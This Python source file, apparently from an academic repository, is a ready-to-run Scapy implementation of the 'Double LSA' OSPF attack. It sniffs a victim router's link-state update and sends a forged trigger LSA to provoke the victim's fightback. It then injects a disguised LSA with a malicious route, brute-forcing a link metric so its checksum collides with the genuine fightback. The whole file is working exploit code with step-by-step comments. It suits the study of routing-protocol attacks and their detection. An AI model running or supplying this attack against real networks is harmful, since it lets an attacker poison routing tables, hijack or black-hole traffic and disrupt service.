#!/usr/bin/env python
"""
Double LSA OSPF Attack
Author:	Alston
Date:	2020.7.10

Updated by: Leo Åkerberg & Viktor Johansson Baurne
Date: 2024.05.02
Original version downloaded from Github: https://github.com/lizitong67/OSPF_Attack_and_Detection/blob/master/double_lsa_attack.py
"""

from scapy.all import *
from time import *

#####################################################
# Utils functions		 							#
#####################################################

# Checks if the incoming packet is an OSFP LS Update packet sent from the victim router.

"""
We updated this function to be more precise. Previously there was a possibility for this
function to return LSU's with both Router LSA's and Network LSA's. We made it more narrow
to only include packets with ONE Router LSA.
"""
def check_incoming_packet(victim, pkt):
    # Check if the packet contains an OSPF_LSUpd layer
    if OSPF_LSUpd in pkt:
        # Ensure that there is exactly one LSA in the update
        if len(pkt[OSPF_LSUpd].lsalist) == 1:
            # Retrieve the first (and only) LSA
            lsa = pkt[OSPF_LSUpd].lsalist[0]
            # Check if it's a Router LSA and if the advertising router is the victim
            if isinstance(lsa, OSPF_Router_LSA) and lsa.adrouter == victim:
                return True
    return False

# Returns the last index of the victim router LSA taken from the originally captured packet
def get_victim_lsa_index(victim, pkt):
	position = 0
	if OSPF_Router_LSA in pkt:
		for lsa in pkt[OSPF_LSUpd].lsalist:
			if lsa[OSPF_Router_LSA].adrouter == victim:
				break
			position += 1
	return position


# Bruteforce the checksum value by changing the last two bytes of the Router LSA (the metric field of the bogus link)
def get_fake_metric_value(fightback_lsa, evil_lsa, linkcount):
	tmp_lsa = evil_lsa[OSPF_Router_LSA].copy()
	fightback_checksum = ospf_lsa_checksum(fightback_lsa.build())

	for metric in range(0, 65535):
		tmp_lsa[OSPF_Router_LSA].linklist[linkcount].metric = metric
		tmp_checksum = ospf_lsa_checksum(tmp_lsa.build())

		if tmp_checksum == fightback_checksum:
			return metric
	return 0


if __name__ == '__main__':
	load_contrib("ospf")

	#####################################################
	# Initial configuration 							#
	#####################################################

	victim = "192.168.2.2" 			# Change this to the victim router (DR)
	trigger_send_ip = "192.168.0.1" 	# From what IP should we send the trigger to victim?
	trigger_send_if = 'eth0' 		# From what interface should we send the trigger to victim?
	disguised_send_ip = "192.168.3.1"	# From what IP should we send the disguised LSA to target?
	disguised_send_if = 'eth1'		# From what interface should we send the disguised LSA to target?

	#####################################################
	# Sniffing for the original package					#
	#####################################################

	#Sniff all the OSFP packets and stop when the first OSPF Router LSA is received from the victim router.
	print("[+] Staring sniffing for LSUpdate from the victim's router...")
	pkts = sniff(filter="proto ospf", stop_filter=lambda x: check_incoming_packet(victim, x))

	# Get the last packet and copy it.
	pkt_orig = pkts[-1].copy()

	#####################################################
	# Prepare the triggering packet 					#
	#####################################################
	print("[+] Preparing trigger packet...")

	"""
	We prepare a trigger packet containing only one Router LSA:
	this is taken from the original package sent by the victim router.
	"""
	pkt_trig = pkts[-1].copy()
	victim_lsa_index = get_victim_lsa_index(victim, pkt_orig)

	# Increase the sequence of the trigger LSA by one, compared to the captured packet
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].seq += 1

	"""
	Here we insert a random link, just to create an LSUpdate which seems advertised
	by the victim router, but which contains fake information. This will force the
	victim router to trigger the fightback mechanism.
	"""
	trigger_link = OSPF_Link(metric=10,
							 toscount=0,
							 type=3,
							 data="255.255.255.0",
							 id="172.16.66.0")


	# Addition of the triggering OSPF Link in the trigger packet.
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist.extend(trigger_link)
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += 12
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = \
		len(pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)

	"""
	Now that the packet is ready, we let Scapy recalculate length, checksums, etc..
	Moreover, we update the source and destionatio IPs, and the source IP in the OSPF
	header.
	"""
	pkt_trig[IP].src = trigger_send_ip
	pkt_trig[IP].dst = "224.0.0.5"
	pkt_trig[IP].chksum = None
	pkt_trig[IP].len = None
	pkt_trig[OSPF_Hdr].chksum = None
	pkt_trig[OSPF_Hdr].len = None
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len = None
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].chksum = None

	#####################################################
	# Prepare the disguised packet 						#
	#####################################################
	print("[+] Preparing disguised packet...")


	# Get a fresh copy of the original packet.
	pkt_evil = pkts[-1].copy()

	# Generate the malicious link for the disguised LSA.
	malicious_link = OSPF_Link(metric=10,
							   toscount=0,
							   type=3,
							   data="255.255.255.0",
							   id="172.16.254.0")

	# Addition of the malicious OSPF Link in the LSA_disguised packet.
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist.extend(malicious_link)
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += 12
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = \
		len(pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)

	"""
	The sequence number of the packet evil is incremented by 2 because
	the trigger sequence is equal to the original packet sequence, plus one.
	It then triggers the fightback mechanism, which produces a packet with
	the sequence number equal to the trigger's sequence number, plus one.
	"""
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].seq += 2

	#####################################################
	# Calculate the disguised packet 					#
	#####################################################
	print("[+] Bruteforcing the checksum!")

	# Preparing the OSPF Link to fake the checksum.
	checksum_link = OSPF_Link(metric=0,
							  toscount=0,
							  type=3,
							  data="255.255.255.0",
							  id="172.16.253.0")

	# Addition of an OSPF Link in the LSA_disguised packet in order to change the checksum later.
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist.extend(checksum_link)
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += 12
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = \
		len(pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)

	"""
	Due to the fact that the metric is 2 bytes long and that C0 and C1 are always evaluated as mod(255),
	there is no need to change all the other parameters. We are guaranteed a collision by only changing metric.
	"""
	count = pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount - 1
	pkt_orig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].seq += 2
	faked_metric = get_fake_metric_value(pkt_orig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA], \
										 pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA], count)
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist[count][OSPF_Link].metric = faked_metric

	print("[+] Collision found! Time to send the pkts...")

	# Now that the packet is ready, we let Scapy recalculate length, checksums, etc..
	pkt_evil[IP].src = disguised_send_ip
	pkt_evil[IP].dst = "224.0.0.5"
	pkt_evil[IP].chksum = None
	pkt_evil[IP].len = None
	pkt_evil[OSPF_Hdr].chksum = None
	pkt_evil[OSPF_Hdr].len = None
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].chksum = None

	# Send trigger packet to trigger the fightback mechanism
	sendp(pkt_trig, iface=trigger_send_if)
	sleep(2)
	# Send disguised LSA packet to create malicious links
	sendp(pkt_evil, iface=disguised_send_if)
